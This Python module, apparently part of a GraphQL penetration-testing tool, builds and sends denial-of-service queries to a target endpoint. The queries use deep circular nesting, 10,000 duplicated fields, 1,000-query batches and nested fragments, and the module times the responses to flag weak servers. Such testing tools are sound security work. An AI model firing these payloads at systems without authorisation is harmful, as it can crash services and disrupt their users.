"""
Version: 2.1
Author: Aleksa Zatezalo
Date: April 2025
Description: GraphQL DoS testing module with schema-aware query generation and improved reporting
"""

import asyncio
import time
from typing import Dict, List, Optional, Tuple
from base_tester import BaseTester


class crush(BaseTester):
    """
    A class for testing GraphQL endpoints for various Denial of Service vulnerabilities.
    Generates targeted queries based on introspection of the actual schema.
    """

    def __init__(self):
        """Initialize the DoS tester with default settings."""
        super().__init__()
        self.tests_run = 0
        self.vulnerabilities_found = 0

    def printVulnerabilityDetails(
        self, vuln_type: str, is_vulnerable: bool, duration: float
    ):
        """Print detailed information about the vulnerability test results."""

        if is_vulnerable:
            self.message.printMsg(
                f"Endpoint is VULNERABLE to {vuln_type}!", status="failed"
            )
            self.message.printMsg(
                f"Response time: {duration:.2f} seconds", status="failed"
            )
            self.vulnerabilities_found += 1
        else:
            # Use the new printTestResult method
            self.message.printTestResult(
                vuln_type, 
                vulnerable=False,
                details=f"Response time: {duration:.2f} seconds (below threshold)"
            )

    def generateCircularQuery(self) -> str:
        """
        Generate a deeply nested circular query based on schema types that reference each other.
        Creates a complex recursive query pattern to test for DoS vulnerabilities.
        """
        # Get circular references from schema manager
        circular_refs = self.schema_manager.find_circular_references()
        
        if not circular_refs:
            return ""

        # Pick first circular reference to start with
        base_ref = circular_refs[0]

        # Create deeply nested query
        nested_query = """
            id
            name 
            description
            createdAt
        """

        # Build up nested levels
        for _ in range(10):
            nested_query = f"""
            {base_ref['field']} {{
                id
                name
                description
                createdAt
                {nested_query}
                {base_ref['field']} {{
                    id
                    name
                    description 
                    {nested_query}
                }}
            }}
            """

        # Duplicate the entire query structure multiple times
        full_query = f"""
        query CircularQuery {{
            {nested_query}
            {nested_query}
            {nested_query}
        }}
        """

        return full_query

    def generateFieldDuplication(self) -> str:
        """
        Generate a query with duplicated fields based on schema.
        """
        if not self.schema_manager.query_type:
            return ""

        # Get all scalar fields from the query type
        scalar_fields = self.schema_manager.get_scalar_fields(self.schema_manager.query_type)
        
        if not scalar_fields:
            return ""

        # Duplicate the first scalar field many times
        duplicated_field = f"{scalar_fields[0]}\n" * 10000
        return f"query {{ {duplicated_field} }}"

    def generateObjectOverride(self) -> str:
        """
        Generate a deeply nested query based on schema types.
        """
        if not self.schema_manager.query_type:
            return ""

        # Find a field that returns an object type
        object_fields = self.schema_manager.get_object_fields(self.schema_manager.query_type)
        
        if not object_fields:
            return ""

        # Create deeply nested query
        nested_levels = 100
        current_query = "id"
        for _ in range(nested_levels):
            current_query = f"""
            {object_fields[0]['name']} {{
                {current_query}
            }}
            """

        return f"query {{ {current_query} }}"

    def generateArrayBatching(self) -> List[Dict[str, str]]:
        """
        Generate a batch of queries based on schema.
        """
        if not self.schema_manager.query_type or not self.schema_manager.query_fields:
            return []

        # Get first available field
        first_field = next(iter(self.schema_manager.query_fields.keys()), None)
        if not first_field:
            return []

        # Create batch of simple queries
        return [
            {
                "query": f"""
            query {{
                {first_field} {{
                    id
                }}
            }}
            """
            }
            for _ in range(1000)
        ]

    def generateDirectoryOverload(self) -> str:
        """
        Generate a query that attempts to overload the system by creating deep directory-like structures.
        Creates deeply nested fragments and type combinations to stress the resolver.
        """
        # Find nested types using schema manager
        nested_types = self.schema_manager.find_circular_references()
        
        if not nested_types:
            return ""

        # Create fragments for each nested type
        fragments = []
        query_fields = []

        for i, type_info in enumerate(
            nested_types[:5]
        ):  # Limit to 5 types to avoid excessive complexity
            fragment_name = f"Frag{i}"
            field_name = type_info["field"]

            # Create a deeply nested fragment
            inner_fields = """
                id
                name
                createdAt
                updatedAt
            """

            # Create nested structure
            for _ in range(5):  # Create 5 levels of nesting
                inner_fields = f"""
                    {field_name} {{
                        {inner_fields}
                        {field_name} {{
                            {inner_fields}
                        }}
                    }}
                """

            # Create fragment
            fragments.append(
                f"""
            fragment {fragment_name} on {type_info["type"]} {{
                {inner_fields}
            }}
            """
            )

            # Add fragment spread to query
            query_fields.append(
                f"""
            {field_name} {{
                ...{fragment_name}
            }}
            """
            )

        # Combine everything into a single query
        full_query = f"""
        query DirectoryOverload {{
            {' '.join(query_fields)}
        }}
        
        {' '.join(fragments)}
        """

        return full_query

    async def testDirectoryOverload(self) -> Tuple[bool, float]:
        """Test for directory overloading vulnerability using schema-based query."""
        self.tests_run += 1
        
        query = self.generateDirectoryOverload()
        if not query:
            self.message.printMsg("Cannot generate Directory Overload query - insufficient schema information", status="warning")
            return False, 0.0

        start_time = time.time()
        try:
            result = await self.client.graphql(query, use_cache=False)
            duration = time.time() - start_time
            is_vulnerable = duration > 5 or "errors" in result and any(
                "timeout" in str(err.get("message", "")).lower() for err in result.get("errors", [])
            )
            return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception as e:
            self.message.printMsg(f"Error testing Directory Overload: {str(e)}", status="error")
            return False, 0.0

    async def testCircularQuery(self) -> Tuple[bool, float]:
        """Test for circular query vulnerability using schema-based query."""
        self.tests_run += 1
        
        query = self.generateCircularQuery()
        if not query:
            self.message.printMsg("Cannot generate Circular Query - insufficient schema information", status="warning")
            return False, 0.0

        start_time = time.time()
        try:
            result = await self.client.graphql(query, use_cache=False)
            duration = time.time() - start_time
            is_vulnerable = duration > 5 or "errors" in result and any(
                "timeout" in str(err.get("message", "")).lower() for err in result.get("errors", [])
            )
            return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception as e:
            self.message.printMsg(f"Error testing Circular Query: {str(e)}", status="error")
            return False, 0.0

    async def testFieldDuplication(self) -> Tuple[bool, float]:
        """Test for field duplication vulnerability using schema-based query."""
        self.tests_run += 1
        
        query = self.generateFieldDuplication()
        if not query:
            self.message.printMsg("Cannot generate Field Duplication query - insufficient schema information", status="warning")
            return False, 0.0

        start_time = time.time()
        try:
            result = await self.client.graphql(query, use_cache=False)
            duration = time.time() - start_time
            is_vulnerable = duration > 5 or "errors" in result and any(
                "timeout" in str(err.get("message", "")).lower() for err in result.get("errors", [])
            )
            return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception as e:
            self.message.printMsg(f"Error testing Field Duplication: {str(e)}", status="error")
            return False, 0.0

    async def testArrayBatching(self) -> Tuple[bool, float]:
        """Test for array batching vulnerability using schema-based query."""
        self.tests_run += 1
        
        queries = self.generateArrayBatching()
        if not queries:
            self.message.printMsg("Cannot generate Array Batching queries - insufficient schema information", status="warning")
            return False, 0.0

        start_time = time.time()
        try:
            # For batch queries, we need to use a raw request
            result = await self.client.request("POST", json=queries)
            duration = time.time() - start_time
            is_vulnerable = duration > 5 or "errors" in result and any(
                "timeout" in str(err.get("message", "")).lower() for err in result.get("errors", [])
            )
            return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception as e:
            self.message.printMsg(f"Error testing Array Batching: {str(e)}", status="error")
            return False, 0.0

    async def testEndpointDos(self):
        """
        Test the endpoint for all DoS vulnerabilities using schema-based queries.
        """
        if not self.client.endpoint:
            self.message.printMsg(
                "No endpoint set. Run set_endpoint first.",
                status="failed",
            )
            return

        self.message.printMsg(
            f"Testing endpoint {self.client.endpoint} for DOS attacks", status="success"
        )
        self.message.printMsg(
            f"The application may crash during testing. Please proxy in Burp for further analysis.",
            status="warning",
        )

        # Reset counters
        self.tests_run = 0
        self.vulnerabilities_found = 0
        start_time = time.time()

        tests = [
            ("Circular Query DoS", self.testCircularQuery),
            ("Field Duplication DoS", self.testFieldDuplication),
            ("Array Batching DoS", self.testArrayBatching),
            ("Directory Overloading DoS", self.testDirectoryOverload),
        ]

        for vuln_type, test_func in tests:
            self.message.printMsg(f"Testing for {vuln_type}...", status="log")
            is_vulnerable, duration = await test_func()
            self.printVulnerabilityDetails(vuln_type, is_vulnerable, duration)
            await asyncio.sleep(5)  # Reduced wait time between tests
        
        # Print summary
        end_time = time.time()
        self.message.printScanSummary(
            tests_run=self.tests_run,
            vulnerabilities_found=self.vulnerabilities_found,
            scan_time=end_time - start_time
        )